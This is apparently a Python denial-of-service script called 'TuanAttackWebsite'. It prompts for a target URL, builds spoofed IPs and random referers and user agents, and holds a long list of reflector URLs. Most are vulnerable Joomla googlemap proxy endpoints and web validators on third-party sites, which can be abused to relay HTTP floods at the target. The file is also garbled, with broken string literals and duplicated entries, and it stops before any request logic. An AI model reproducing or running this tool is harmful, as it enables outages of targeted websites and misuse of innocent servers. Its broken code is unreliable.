
########################################
#       TuanAttackWebsite       #
########################################

import os
import requests
import threading
import random
import sys
import argparse
from colorama import Fore
import json
import random


# Procura um IP aleatório
def random_IP():
    ip = []
    for _ in range(0, 4):
        ip.append(str(random.randint(1, 255)))
    return ".".join(ip)


# Procura uma referência aleatória
def random_referer():
    with open("IP/referers.txt", "r") as referers:
        referers = referers.readlines()
    return random.choice(referers)


# Procura um user agent aleatório
def random_useragent():
    with open("IP/user_agents.json", "r") as agents:
        user_agents = json.load(agents)["agents"]
    return random.choice(user_agents)


if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")


url = input("URL:  ").strip()


count = 0
headers = []
referer = [
    "https://google.it/",
    "https://facebook.com/",
    "https://duckduckgo.com/",
    "https://google.com/",
    "https://youtube.com",
    "https://yandex.com",
     "https://www.facebook.com/l.php?u=",     "https://www.facebook.com/l.php?u=",
     "https://www.facebook.com/sharer/sharer.php?u=",     "https://www.facebook.com/sharer/sharer.php?u=",
     "https://drive.google.com/viewerng/viewer?url=",
     "http://www.google.com/translate?u=",
     "https://developers.google.com/speed/pagespeed/insights/?url=",
     "http://help.baidu.com/searchResult?keywords=",
     "http://www.bing.com/search?q=",
     "https://add.my.yahoo.com/rss?url=",
     "https://play.google.com/store/search?q=",
     "http://www.google.com/?q=",
     "http://regex.info/exif.cgi?url=",
     "http://anonymouse.org/cgi-bin/anon-www.cgi/
     "http://www.google.com/translate?u=",
     "http://translate.google.com/translate?u=",
     "http://validator.w3.org/feed/check.cgi?url=",
     "http://www.w3.org/2001/03/webdata/xsv?style=",xsl&docAddrs=",
     "http://validator.w3.org/check?uri=",
     "http://jigsaw.w3.org/css-validator/validator?uri=",
     "http://validator.w3.org/checklink?uri=",
     "http://www.w3.org/RDF/Validator/ARPServlet?URI=",
     "http://www.w3.org/2005/08/online_xslt/xslt?xslfile=",     "http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=",
     "http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=",     "http://www.w3.org&xslfile=",
     "http://validator.w3.org/mobile/check?docAddr=",
     "http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
     "http://online.htmlvalidator.com/php/onlinevallite.php?url=",
     "http://feedvalidator.org/check.cgi?url=",
     "http://gmodules.com/ig/creator?url=",
     "http://www.google.com/ig/adde?moduleurl=",
     "http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=",-1&url1=",
     "http://www.watchmouse.com/en/checkit.php?c=",jpcheckit&vurl=",
     "http://host-tracker.com/check_page/?furl=",
     "http://panel.stopthehacker.com/services/validate-payflow?email=",1@1.com&callback=",a&target=",
     "http://www.onlinewebcheck.com/check.php?url=",
     "http://www.online-translator.com/url/translation.aspx?direction=",er&sourceURL=",
     "http://www.translate.ru/url/translation.aspx?direction=",er&sourceURL=",
     "http://about42.nl/www/showheaders.php;POST;about42.nl.txt
     "http://browsershots.org;POST;browsershots.org.txt
     "http://streamitwebseries.twww.tv/proxy.php?url=",
     "http://www.comicgeekspeak.com/proxy.php?url=",
     "http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=",
     "http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt
     "http://web-sniffer.net/?url=",
     "http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://translate.yandex.ru/translate?srv=",yasearch&lang=",ru-uk&url=",
     "http://translate.yandex.ua/translate?srv=",yasearch&lang=",ru-uk&url=",
     "http://translate.yandex.net/tr-url/ru-uk.uk/
     "http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=",;BYPASS
     "http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=",1&h=",1&file=",
     "http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=",1&h=",1&file=",
     "http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=",1&h=",1&file=",
     "http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=",?url=",
     "http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=",
     "http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://fets3.freetranslation.com/?Language=",English%2FSpanish&Sequence=",core&Url=",
     "http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://validator.w3.org/unicorn/check?ucn_task=",conformance&ucn_uri=",
     "http://validator.w3.org/nu/?doc=",
     "http://check-host.net/check-     "http?host=",
     "http://www.netvibes.com/subscribe.php?url=",
     "http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.google.com/ig/add?feedurl=",
     "http://anonymouse.org/cgi-bin/anon-www.cgi/
     "http://www.google.com/translate?u=",
     "http://translate.google.com/translate?u=",
     "http://validator.w3.org/feed/check.cgi?url=",
     "http://www.w3.org/2001/03/webdata/xsv?style=",xsl&docAddrs=",
     "http://validator.w3.org/check?uri=",
     "http://jigsaw.w3.org/css-validator/validator?uri=",
     "http://validator.w3.org/checklink?uri=",
     "http://qa-dev.w3.org/unicorn/check?ucn_task=",conformance&ucn_uri=",
     "http://www.w3.org/RDF/Validator/ARPServlet?URI=",
     "http://www.w3.org/2005/08/online_xslt/xslt?xslfile=",     "http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=",
     "http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=",     "http://www.w3.org&xslfile=",
     "http://www.w3.org/services/tidy?docAddr=",
     "http://validator.w3.org/mobile/check?docAddr=",
     "http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
     "http://validator.w3.org/p3p/20020128/policy.pl?uri=",
     "http://online.htmlvalidator.com/php/onlinevallite.php?url=",
     "http://feedvalidator.org/check.cgi?url=",
     "http://gmodules.com/ig/creator?url=",
     "http://www.google.com/ig/adde?moduleurl=",
     "http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=",-1&url1=",
     "http://www.watchmouse.com/en/checkit.php?c=",jpcheckit&vurl=",
     "http://host-tracker.com/check_page/?furl=",
     "http://panel.stopthehacker.com/services/validate-payflow?email=",1@1.com&callback=",a&target=",
     "http://www.viewdns.info/ismysitedown/?domain=",
     "http://www.onlinewebcheck.com/check.php?url=",
     "http://www.online-translator.com/url/translation.aspx?direction=",er&sourceURL=",
     "http://www.translate.ru/url/translation.aspx?direction=",er&sourceURL=",
     "http://about42.nl/www/showheaders.php;POST;about42.nl.txt
     "http://browsershots.org;POST;browsershots.org.txt
     "http://streamitwebseries.twww.tv/proxy.php?url=",
     "http://www.comicgeekspeak.com/proxy.php?url=",
     "http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://ijzerhandeljanssen.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://link2europe.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://peelmc.ca/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://s2p.lt/main/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://smartonecity.com/pt/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://snelderssport.nl/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://sunnyhillsassistedliving.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://thevintagechurch.com/www2/index.php?url=",/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.abc-haus.ch/reinigung/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.alhambrahotel.net/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.aliento.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=",
     "http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fotorima.com/rima/site2/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.icel.be/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.idea-designer.com/idea/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.jana-wagenknecht.de/wcms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kjg-hemer.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.labonnevie-guesthouse-jersey.com/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.oliebollen.me/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.paro-nl.com/v2/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.precak.sk/penzion/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.pyrenees-cerdagne.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.rethinkingjournalism.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sealyham.sk/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.siroki.it/newsite/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.uchlhr.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.virmcc.de/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.visitsliven.com/bg/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.yigilca.gov.tr/_tr/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.dunaexpert.hu/home/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.stephanus-web.de/joomla1015/mambots/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt
     "http://web-sniffer.net/?url=",
     "http://www.map-mc.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://diegoborba.com.br/andes/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://karismatic.com.my/new/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.awf.co.nz/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://translate.yandex.ru/translate?srv=",yasearch&lang=",ru-uk&url=",
     "http://translate.yandex.ua/translate?srv=",yasearch&lang=",ru-uk&url=",
     "http://translate.yandex.net/tr-url/ru-uk.uk/
     "http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.phimedia.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.epcelektrik.com/en/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.oldbrogue.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.mcdp.eu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.printingit.ie/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=",
